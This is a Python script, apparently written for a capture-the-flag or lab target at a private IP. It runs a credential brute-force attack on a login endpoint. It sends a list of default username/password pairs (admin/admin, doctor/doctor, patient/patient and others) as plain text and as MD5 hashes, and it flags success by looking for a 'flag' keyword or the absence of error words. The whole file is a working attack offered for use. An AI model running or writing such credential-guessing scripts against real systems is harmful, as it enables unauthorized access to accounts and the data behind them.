import requests
import json
import hashlib
import sys

TARGET_URL = "http://10.0.162.114:5003/login"

CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("test", "test"),
    ("user", "user"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("medical", "medical"),
    ("patient", "patient"),
    ("doctor", "doctor"),
    ("nurse", "nurse"),
]

HEADERS = {
    "Content-Type": "application/json"
}

def try_login(username, password):
    payload = {
        "username": username,
        "password": password
    }
    
    try:
        response = requests.post(TARGET_URL, headers=HEADERS, json=payload, timeout=10)
        
        # Try plain text password
        if response.status_code == 200 and "flag" in response.text.lower():
            return True, response.text, "plain"
            
        # Try MD5 hashed password as hinted
        md5_password = hashlib.md5(password.encode('utf-8')).hexdigest()
        md5_payload = {
            "username": username,
            "password": md5_password
        }
        response_md5 = requests.post(TARGET_URL, headers=HEADERS, json=md5_payload, timeout=10)
        if response_md5.status_code == 200 and "flag" in response_md5.text.lower():
            return True, response_md5.text, "md5"
            
        # Fallback success check if 'flag' keyword is not present but status is 200 and not failed
        if response.status_code == 200 and "invalid" not in response.text.lower() and "fail" not in response.text.lower() and "error" not in response.text.lower():
            return True, response.text, "plain"
            
        if response_md5.status_code == 200 and "invalid" not in response_md5.text.lower() and "fail" not in response_md5.text.lower() and "error" not in response_md5.text.lower():
            return True, response_md5.text, "md5"

        return False, response.text, "plain"
        
    except requests.exceptions.RequestException as e:
        return False, str(e), "plain"

def main():
    print(f"[*] Starting brute force attack on {TARGET_URL}")
    
    for username, password in CREDENTIALS:
        print(f"[-] Trying: {username}/{password}")
        success, response_text, p_type = try_login(username, password)
        
        if success:
            print("\n[+] Login Successful!")
            print(f"[+] Username: {username}")
            print(f"[+] Password: {password} ({p_type})")
            print(f"[+] Response: {response_text}")
            sys.exit(0)
            
    print("\n[-] Brute force completed. No valid credentials found.")

if __name__ == "__main__":
    main()